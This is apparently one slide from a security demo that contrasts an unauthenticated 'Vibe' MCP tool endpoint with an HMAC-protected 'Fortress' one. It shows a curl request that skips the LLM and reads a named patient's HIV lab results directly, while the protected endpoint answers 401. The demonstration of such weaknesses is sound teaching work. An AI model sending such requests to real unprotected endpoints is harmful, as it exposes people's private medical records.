Attack 7 — No LLM Required

The Vibe tool endpoints have no auth. Curl them directly. The LLM is just a middleman.

🔴 Vibe (no auth)
curl -X POST localhost:8000/mcp-vibe/get_patient_labs \
  -H "Content-Type: application/json" \
  -d '{"patient_id": 12}'

# Returns: Taylor Morgan's HIV+ labs
# No token. No auth. Just works.
🛡 Fortress (HMAC required)
curl -X POST localhost:8000/mcp-fortress/get_patient_labs \
  -H "Content-Type: application/json" \
  -d '{"patient_id": 12}'

# Returns: 401 Unauthorized
# Missing X-Caller-Sig header
